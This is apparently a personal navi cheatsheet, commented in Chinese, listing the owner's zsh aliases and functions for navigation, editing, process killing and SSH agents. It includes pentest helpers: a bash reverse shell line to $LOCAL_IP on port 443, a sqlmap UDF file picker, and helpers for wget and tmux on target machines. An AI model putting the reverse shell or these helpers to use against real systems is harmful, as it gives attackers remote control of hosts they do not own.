% linux,tips

; 用于提醒自己某个自定义函数或者别名的作用

# zinit 的简写
zi

# 从 ${HOME}/dict 中获得一个字典的路径并且复制到剪切板
pdict

# 跳转到指定目录或者当前目录下的一个文件夹内
cde <path_or_null>

# 从 sqlmap 自带的 udf 文件中选择一个 udf 文件， 解压到当前目录下
udf_pick

# 编辑当前目录或者某个指定目录下的文件
ef <path_or_null>

# 获取当前的 wan_ip 保存到环境变量 WAN_IP 中
wan_ip

# 通过 fzf 中结进程
fkill

# 生成一个简单的反弹shell
;echo "bash -i >& /dev/tcp/$LOCAL_IP/443 0>&1" > /tmp/temp_bash
bash_shell

# 将 wget 下载命令行复制到剪切板
wget_echo <file_name>

# 在目标机器上启用 tmux 接管 ssh
ssht <ssh_options_like_common>

# 查询 alias 的定义
alias-search

# 查询函数定义
whence -f <function_name>

# 解决 windows 下没有 pip 的问题
python -m ensurepip

# 生成 navi 以及其他应用程序的 需要的cache文件
make-cache

# alt+up 返回上级目录
<alt+up>

# alt+down 进入下级目录
<alt+down>

# 设置 SSH_AUTH_SOCK 为 ssh agent
SSH_SOCK

# 设置 SSH_AUTH_SOCK 为 gpg agent
GPG_SOCK

# 使用 fzf 选择最近的 10 条目录
dw

# 跳转到当前目录下的子目录
cde

# 编辑当前文件夹下的文件
ef

# 编辑当前文件夹(包括子文件夹)下的所有文件
efa

# 交互选择历史目录
dh

# 交互选择父目录
de

# 创建 docker 符号链接
symbol-link

# 使用 ${EDITOR} 编辑 ~/.zshrc
vimzsh

# 使用 ${EDITOR} 编辑 init.vim
vimconfig

#  编辑 tmux.conf
vimtmux

# 使用 fzf kill 进程
fkill

# docker-compose 设置需要的 docker 文件的映射
docker_link
